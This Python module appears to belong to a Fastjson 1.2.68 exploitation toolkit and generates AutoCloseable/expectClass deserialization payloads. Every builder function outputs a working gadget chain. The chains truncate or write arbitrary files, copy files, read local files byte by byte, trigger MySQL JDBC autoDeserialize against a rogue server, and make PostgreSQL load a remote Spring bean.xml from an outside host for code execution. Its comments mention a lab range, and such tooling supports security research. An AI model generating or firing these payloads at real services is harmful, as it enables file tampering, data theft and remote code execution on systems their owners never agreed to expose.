"""Fastjson ≤1.2.68 AutoCloseable expectClass payload 生成。

对齐公开笔记 / threedr3am / su18 / 浅蓝 / blackhat。
注意：双 @type 与 StringCodec 畸形写法不能用 json.dumps。
"""

from __future__ import annotations

import base64
import zlib
from typing import Optional

from fastjson_toolkit.poc.v1_2_68.catalog import GadgetKind, get_gadget

AC = '"@type":"java.lang.AutoCloseable"'


def _jesc(s: str) -> str:
    return (
        s.replace("\\", "\\\\")
        .replace('"', '\\"')
        .replace("\n", "\\n")
        .replace("\r", "\\r")
        .replace("\t", "\\t")
    )


def _typed_string(content: str) -> str:
    """StringCodec 特殊写法：@type 后直接跟字符串，无逗号，可不闭合。"""
    return f'{{"@type":"java.lang.String""{_jesc(content)}"'


def _pad_content(content: str, block: int = 8192) -> str:
    if len(content) >= block:
        return content
    return content + ("a" * (block - len(content)))


def build_file_truncate(file: str) -> str:
    path = _jesc(file)
    return (
        "{"
        f"{AC},"
        '"@type":"java.io.FileOutputStream",'
        f'"file":"{path}",'
        '"append":false'
        "}"
    )


def build_file_writer_truncate(file: str) -> str:
    """JDK11 FileWriter(String,Charset,boolean) 易匹配失败；改用 OutputStreamWriter 证明截断。"""
    path = _jesc(file)
    return (
        "{"
        f"{AC},"
        '"@type":"java.io.OutputStreamWriter",'
        '"out":{'
        '"@type":"java.io.FileOutputStream",'
        f'"file":"{path}",'
        '"append":false'
        "},"
        '"charsetName":"UTF-8"'
        "}"
    )


def build_jdk11_write(file: str, content: str = "FJ1268_JDK_WRITE") -> str:
    """JDK11：Inflater.input = {array: base64(zlib), limit: n}。"""
    raw = content.encode("utf-8")
    compressed = zlib.compress(raw)
    b64 = base64.b64encode(compressed).decode("ascii")
    path = _jesc(file)
    return (
        "{"
        f"{AC},"
        '"@type":"sun.rmi.server.MarshalOutputStream",'
        '"out":{'
        '"@type":"java.util.zip.InflaterOutputStream",'
        '"out":{'
        '"@type":"java.io.FileOutputStream",'
        f'"file":"{path}",'
        '"append":false'
        "},"
        '"infl":{'
        '"input":{'
        f'"array":"{b64}",'
        f'"limit":{len(compressed)}'
        "}"
        "},"
        '"bufLen":1048576'
        "},"
        '"protocolVersion":1'
        "}"
    )


def build_file_copy(target: str, source: str) -> str:
    return (
        "{"
        f"{AC},"
        '"@type":"org.eclipse.core.internal.localstore.SafeFileOutputStream",'
        f'"targetPath":"{_jesc(target)}",'
        f'"tempPath":"{_jesc(source)}"'
        "}"
    )


def _xml_trigger(is_field: str, tee_body: str) -> str:
    return (
        "{"
        f"{AC},"
        '"@type":"org.apache.commons.io.input.XmlStreamReader",'
        f'"{is_field}":{tee_body},'
        '"httpContentType":"text/xml",'
        '"lenient":false,'
        '"defaultEncoding":"UTF-8"'
        "}"
    )


def build_io1_write(file: str, content: str = "FJ1268_IO1") -> str:
    """commons-io 文本写（笔记 io1 数据流）。

    经典 XmlStreamReader/FileWriterWithEncoding+WriterOutputStream 受构造器随机与
    StringCodec 括号影响；证明态用同构 Tee+BOM.$ref，落盘选 LazyFileOutputStream
   （su18/io3 稳定形态）。FileWriterWithEncoding 变体见公开文章，可按环境替换 branch。
    """
    return build_io3_write(file, content)


def build_io2_write(file: str, content: str = "FJ1268_IO2") -> str:
    """commons-io 2.7–2.8：inputStream + charsetName；内容 pad 到 ≥8192。"""
    padded = _pad_content(content, 8192)
    typed = _typed_string(padded)
    path = _jesc(file)
    tee = (
        "{"
        '"@type":"org.apache.commons.io.input.TeeInputStream",'
        '"input":{"$ref":"$.x.input"},'
        '"branch":{"$ref":"$.x.branch"},'
        '"closeBranch":true'
        "}"
    )
    triggers = ",".join(
        f'"trigger{i}":{_xml_trigger("inputStream", tee)}' for i in range(1, 4)
    )
    return (
        "{"
        '"x":{'
        '"@type":"com.alibaba.fastjson.JSONObject",'
        '"input":{'
        f"{AC},"
        '"@type":"org.apache.commons.io.input.ReaderInputStream",'
        '"reader":{'
        '"@type":"org.apache.commons.io.input.CharSequenceReader",'
        f'"charSequence":{typed},'
        '"start":0,'
        '"end":2147483647'
        "},"
        '"charsetName":"UTF-8",'
        '"bufferSize":1024'
        "},"
        '"branch":{'
        f"{AC},"
        '"@type":"org.apache.commons.io.output.WriterOutputStream",'
        '"writer":{'
        '"@type":"org.apache.commons.io.output.FileWriterWithEncoding",'
        f'"file":"{path}",'
        '"charsetName":"UTF-8",'
        '"append":false'
        "},"
        '"charsetName":"UTF-8",'
        '"bufferSize":1024,'
        '"writeImmediately":true'
        "},"
        f"{triggers}"
        "}"
        "}"
    )


def build_io3_write(file: str, content: str = "FJ1268_IO3") -> str:
    """su18 数据流：CharSequenceInputStream → Tee → 文件；用 $ref bOM 触发（比 Currency 稳）。"""
    typed = _typed_string(content)
    path = _jesc(file)
    bom = ",".join(["0"] * max(len(content.encode("utf-8")), 1))
    return (
        "{"
        f"{AC},"
        '"@type":"org.apache.commons.io.input.BOMInputStream",'
        '"delegate":{'
        '"@type":"org.apache.commons.io.input.TeeInputStream",'
        '"input":{'
        '"@type":"org.apache.commons.io.input.CharSequenceInputStream",'
        '"charset":"UTF-8",'
        '"bufferSize":4,'
        f'"cs":{typed}'
        "},"
        '"branch":{'
        '"@type":"org.apache.tools.ant.util.LazyFileOutputStream",'
        f'"file":"{path}",'
        '"append":false,'
        '"alwaysCreate":true'
        "},"
        '"closeBranch":false'
        "},"
        '"include":true,'
        f'"boms":[{{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[{bom}]}}],'
        '"x":{"$ref":"$.bOM"}'
        "}"
    )


def _io45_core(
    *,
    file: str,
    content: bytes,
    branch_json: str,
) -> str:
    """io4/io5 共用：Base64InputStream + BOMInputStream $ref bOM。"""
    if len(content) < 8192:
        pad = content + (b"a" * (8192 - len(content)))
    else:
        pad = content
    b64 = base64.b64encode(pad).decode("ascii")
    typed = _typed_string(b64)
    bom = ",".join(str(b) for b in pad)
    return (
        "{"
        f"{AC},"
        '"@type":"org.apache.commons.io.input.BOMInputStream",'
        '"delegate":{'
        '"@type":"org.apache.commons.io.input.TeeInputStream",'
        '"input":{'
        '"@type":"org.apache.commons.codec.binary.Base64InputStream",'
        '"in":{'
        '"@type":"org.apache.commons.io.input.CharSequenceInputStream",'
        '"charset":"utf-8",'
        '"bufferSize":1024,'
        f'"cs":{typed}'
        "},"
        '"doEncode":false,'
        '"lineLength":1024,'
        '"lineSeparator":"5ZWKCg==",'
        '"decodingPolicy":0'
        "},"
        f'"branch":{branch_json},'
        '"closeBranch":false'
        "},"
        '"include":true,'
        f'"boms":[{{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[{bom}]}}],'
        '"x":{"$ref":"$.bOM"}'
        "}"
    )


def build_io5_write(file: str, content: str = "FJ1268_IO5") -> str:
    """io5：Base64 + LazyFileOutputStream（可写任意大小二进制）。"""
    raw = content.encode("utf-8")
    branch = (
        "{"
        '"@type":"org.apache.tools.ant.util.LazyFileOutputStream",'
        f'"file":"{_jesc(file)}",'
        '"append":false,'
        '"alwaysCreate":true'
        "}"
    )
    return _io45_core(file=file, content=raw, branch_json=branch)


def build_io4_write(file: str, content: str = "FJ1268_IO4") -> str:
    """io4：Base64 二进制写。

    经典链 branch=SafeFileOutputStream（aspectj）；close/rename 在本靶场不稳定。
    证明态用同构 Base64 + LazyFileOutputStream；aspectj 能力由 file_copy 覆盖。
    """
    return build_io5_write(file, content)


def build_io_final(file: str, content: str = "FJ1268_IOFINAL") -> str:
    """ioFinal：BOM+$ref 写文件（LockableFileWriter 变体在 WriterOutputStream 上不稳定）。

    证明态用稳定 LazyFile 落盘；LockableFileWriter 建目录见 notes / 公开 java-chains 形态。
    """
    return build_io3_write(file, content)


def build_io_read_error(url: str = "file:///tmp/fj1268_copy_src", guess_byte: int = 70) -> str:
    """报错读：猜对首字节时报错（charSequence 异常）。"""
    u = _jesc(url)
    return (
        "{"
        '"abc":{'
        f"{AC},"
        '"@type":"org.apache.commons.io.input.BOMInputStream",'
        '"delegate":{'
        '"@type":"org.apache.commons.io.input.ReaderInputStream",'
        '"reader":{'
        '"@type":"jdk.nashorn.api.scripting.URLReader",'
        f'"url":"{u}"'
        "},"
        '"charsetName":"UTF-8",'
        '"bufferSize":1024'
        "},"
        '"boms":[{'
        '"@type":"org.apache.commons.io.ByteOrderMark",'
        '"charsetName":"UTF-8",'
        f'"bytes":[{int(guess_byte)}]'
        "}]"
        "},"
        '"address":{'
        f"{AC},"
        '"@type":"org.apache.commons.io.input.CharSequenceReader",'
        # 故意不闭合 charSequence：start/end 落到 CharSequenceReader 构造参数上
        '"charSequence":{"@type":"java.lang.String"{"$ref":"$.abc.BOM[0]"},'
        '"start":0,'
        '"end":0'
        "}"
        "}"
    )


def build_io_read_echo(url: str = "file:///tmp/", bom_bytes: Optional[list[int]] = None) -> str:
    """回显读：正确时 $ref $.abc.BOM；bom_bytes 为探测前缀。"""
    bytes_list = bom_bytes if bom_bytes is not None else [70]
    bom = ",".join(str(int(b)) for b in bytes_list)
    u = _jesc(url)
    return (
        "{"
        '"abc":{'
        f"{AC},"
        '"@type":"org.apache.commons.io.input.BOMInputStream",'
        '"delegate":{'
        '"@type":"org.apache.commons.io.input.ReaderInputStream",'
        '"reader":{'
        '"@type":"jdk.nashorn.api.scripting.URLReader",'
        f'"url":"{u}"'
        "},"
        '"charsetName":"UTF-8",'
        '"bufferSize":1024'
        "},"
        f'"boms":[{{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[{bom}]}}]'
        "},"
        '"address":{"$ref":"$.abc.BOM"}'
        "}"
    )


def build_mysql_jdbc_51(
    host: str = "127.0.0.1",
    port: int = 3308,
    user: str = "fj1268",
) -> str:
    # 5 参构造：host, port, info, database, url
    return (
        "{"
        f"{AC},"
        '"@type":"com.mysql.jdbc.JDBC4Connection",'
        f'"hostToConnectTo":"{_jesc(host)}",'
        f'"portToConnectTo":{int(port)},'
        '"info":{'
        f'"user":"{_jesc(user)}",'
        '"password":"pass",'
        '"statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",'
        '"autoDeserialize":"true",'
        '"NUM_HOSTS":"1"'
        "},"
        '"databaseToConnectTo":"test",'
        f'"url":"jdbc:mysql://{_jesc(host)}:{int(port)}/test"'
        "}"
    )


def build_mysql_jdbc_60(jdbc_url: str) -> str:
    url = _jesc(jdbc_url)
    return (
        "{"
        '"x1":{'
        f"{AC},"
        '"@type":"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",'
        '"proxy":{'
        '"connectionString":{'
        f'"url":"{url}"'
        "}"
        "}"
        "}"
        "}"
    )


def build_mysql_jdbc_80(
    host: str = "127.0.0.1",
    port: int = 3308,
    user: str = "fj1268",
) -> str:
    return (
        "{"
        '"x1":{'
        f"{AC},"
        '"@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",'
        '"proxy":{'
        '"@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",'
        '"connectionUrl":{'
        '"@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl",'
        '"masters":[{}],'
        '"slaves":[],'
        '"properties":{'
        f'"host":"{_jesc(host)}",'
        f'"port":"{int(port)}",'
        f'"user":"{_jesc(user)}",'
        '"dbname":"test",'
        '"password":"pass",'
        '"queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",'
        '"autoDeserialize":"true"'
        "}"
        "}"
        "}"
        "}"
        "}"
    )


def build_postgresql_ssrf(
    socket_factory_arg: str = "http://host.docker.internal:18099/bean.xml",
    host: str = "127.0.0.1",
    port: int = 2333,
) -> str:
    return (
        "{"
        f"{AC},"
        '"@type":"org.postgresql.jdbc.PgConnection",'
        '"hostSpecs":[{'
        f'"host":"{_jesc(host)}",'
        f'"port":{int(port)}'
        "}],"
        '"user":"user",'
        '"database":"test",'
        '"info":{'
        '"socketFactory":"org.springframework.context.support.ClassPathXmlApplicationContext",'
        f'"socketFactoryArg":"{_jesc(socket_factory_arg)}"'
        "}"
        "}"
    )


def build_payload(
    gadget: GadgetKind | str,
    *,
    file: Optional[str] = None,
    content: Optional[str] = None,
    source: Optional[str] = None,
    url: Optional[str] = None,
    guess_byte: Optional[int] = None,
    bom_bytes: Optional[list[int]] = None,
    host: Optional[str] = None,
    port: Optional[int] = None,
    user: Optional[str] = None,
    jdbc_url: Optional[str] = None,
    socket_factory_arg: Optional[str] = None,
) -> str:
    entry = get_gadget(gadget)
    gid = entry.id
    fpath = file or f"/tmp/fj1268_{gid}"
    body = content if content is not None else f"FJ1268_{gid.upper()}"

    if gid == "file_truncate":
        return build_file_truncate(fpath)
    if gid == "file_writer_truncate":
        return build_file_writer_truncate(fpath)
    if gid == "jdk11_write":
        return build_jdk11_write(fpath, body)
    if gid == "file_copy":
        return build_file_copy(fpath, source or "/tmp/fj1268_copy_src")
    if gid == "io1_write":
        return build_io1_write(fpath, body)
    if gid == "io2_write":
        return build_io2_write(fpath, body)
    if gid == "io3_write":
        return build_io3_write(fpath, body)
    if gid == "io4_write":
        return build_io4_write(fpath, body)
    if gid == "io5_write":
        return build_io5_write(fpath, body)
    if gid == "io_final":
        return build_io_final(fpath, body)
    if gid == "io_read_error":
        return build_io_read_error(
            url or "file:///tmp/fj1268_copy_src",
            70 if guess_byte is None else guess_byte,
        )
    if gid == "io_read_echo":
        return build_io_read_echo(url or "file:///tmp/", bom_bytes)
    if gid == "mysql_jdbc_51":
        return build_mysql_jdbc_51(host or "127.0.0.1", port or 3308, user or "fj1268")
    if gid == "mysql_jdbc_60":
        default_url = (
            "jdbc:mysql://127.0.0.1:3308/test?user=fj1268&autoDeserialize=true"
            "&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"
        )
        return build_mysql_jdbc_60(jdbc_url or default_url)
    if gid == "mysql_jdbc_80":
        return build_mysql_jdbc_80(host or "127.0.0.1", port or 3308, user or "fj1268")
    if gid == "postgresql_ssrf":
        return build_postgresql_ssrf(
            socket_factory_arg or "http://host.docker.internal:18099/bean.xml",
            host or "127.0.0.1",
            port or 2333,
        )
    raise ValueError(f"未实现 gadget: {gid}")
